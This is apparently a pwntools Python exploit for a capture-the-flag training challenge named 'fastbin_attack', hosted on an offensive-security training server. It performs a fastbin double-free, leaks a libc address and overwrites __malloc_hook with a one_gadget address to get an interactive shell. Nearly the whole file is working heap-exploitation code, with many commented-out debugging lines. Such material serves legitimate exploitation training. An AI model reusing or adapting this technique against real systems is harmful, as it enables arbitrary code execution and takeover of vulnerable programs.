from pwn import *

context.arch = 'amd64'

LIBC_OFFSET = 0x3c4b78
MALLOC_HOOK_OFFSET = 0x3c4b10
LIBC = ELF("./libc-2.23.so")
ONE_GADGET = 0xf1247


def alloc(size):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"Size: ")
    """p.sendline(b"%d" % size)
    p.recvuntil(b"index ")
    index = int(p.recvuntil(b"!")[:-1])"""
    p.sendline(str(size))
    #return index

def write(index, data):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b"Index: ")
    #p.sendline(b"%d" % index)
    p.sendline(str(index))
    p.recvuntil(b"Content: ")
    p.send(data)
    #p.recvuntil(b"Done!\n")

def read(index):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b"Index: ")
    #p.sendline(b"%d" % index)
    p.sendline(str(index))
    #data = p.recvuntil(b"\nOptions:")[:-len("\nOptions:")]
    #data = p.recvuntil(b"\nOptions:")
    #data = data[0:8]
    #print(data)
    #return data
    return p.recvuntil(b"\nOptions:").split(b"\nOptions:")[0]

def free(index):
    p.recvuntil(b"> ")
    p.sendline(b"4")
    p.recvuntil(b"Index: ")
    #p.sendline(b"%d" % index)
    p.sendline(str(index))
    #p.recvuntil(b"freed!\n")

#p = process("./fastbin_attack")
p = remote("bin.training.offdef.it", 10101)
alloc(0x60) #0
alloc(0x60) #1
free(0)
free(1)
free(0)

#leak libc
alloc(0xA0) #2
alloc(0x20) #3
free(2)
leak = read(2)
#libc_leak = u64(leak.ljust(8, b"\x00"))
#libc_leak = u64(leak[:6] + b"\x00\x00")
#libc_base = libc_leak - LIBC_OFFSET
libc_leak = u64(leak.ljust(8, b"\x00"))
#libc_leak = u64(leak.ljust(8, b"\x00"))
libc_base = libc_leak - LIBC_OFFSET
#libc_base = u64(leak) - LIBC_OFFSET
#libc_base = p64(libc_base)
#print(hex(libc_base))
target = libc_base - 0x23

"""i2 = alloc(0x30) #index 2
i3 = alloc(0x30)  #index 3
free(i2)
free(i3)
free(i2)
i4 = alloc(0x30) #index 4"""
alloc(0x60) #4
alloc(0x60) #5

#free_hook = 0x3c67a8 + libc_base

write(4, p64(libc_base + MALLOC_HOOK_OFFSET - 0x23))  #0x23 offset where we want to write wrt malloc_hook
#write(i4, p64(LIBC.symbols["__free_hook"]))
#write(i4, p64(libc_base - MALLOC_HOOK_OFFSET - 0x23))

alloc(0x60) #6

alloc(0x60) #7

payload = b"A"*(0x23 - 0x10) + p64(libc_base + ONE_GADGET)
write(7, payload)

#write a valid pointer instead of a (got or malloc hook and free hook). Remember the check on the chunk size

p.interactive()